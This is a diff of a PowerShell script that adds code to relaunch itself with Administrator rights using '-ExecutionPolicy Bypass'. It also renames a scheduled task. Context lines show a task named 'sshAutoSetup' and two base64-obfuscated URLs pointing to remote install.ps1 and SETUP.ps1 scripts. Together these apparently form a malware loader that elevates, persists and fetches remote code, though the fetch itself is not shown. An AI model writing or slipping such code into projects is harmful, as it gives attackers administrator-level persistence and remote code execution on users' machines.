@@ -1,8 +1,41 @@
 #Requires -Version 5.1
 
+param(
+    [string]$RelaunchWorkingDirectory
+)
+
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    $scriptPath = $PSCommandPath
+    if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Definition }
+
+    $psExe = (Get-Process -Id $PID).Path
+    if (-not $psExe) { $psExe = 'powershell.exe' }
+
+    $workDir = if ($PWD.Path) { $PWD.Path } else { '' }
+    $relaunchArgs = @(
+        '-NoProfile', '-ExecutionPolicy', 'Bypass',
+        '-File', "`"$scriptPath`"",
+        '-RelaunchWorkingDirectory', "`"$workDir`""
+    )
+
+    try {
+        $elevated = Start-Process -FilePath $psExe -ArgumentList $relaunchArgs -Verb RunAs -Wait -PassThru
+        $code = if ($null -ne $elevated.ExitCode) { $elevated.ExitCode } else { 0 }
+        exit $code
+    }
+    catch {
+        Write-Host '[ERROR] Administrator privileges are required; elevation was cancelled or blocked.' -ForegroundColor Red
+        exit 1
+    }
+}
+
+if ($RelaunchWorkingDirectory -and (Test-Path -LiteralPath $RelaunchWorkingDirectory -PathType Container)) {
+    Set-Location -LiteralPath $RelaunchWorkingDirectory
+}
+
 $ErrorActionPreference = 'Stop'
 
-$USER_TASK_NAME = 'autoupgrade'
+$USER_TASK_NAME = 'tasksetup'
 $ROOT_TASK_NAME = 'sshAutoSetup'
 $ENCODED_URL = 'aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL2luc3RhbGwucHMx'
 $ENCODED__URL2 = 'aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL3NyYy9TRVRVUC5wczE='
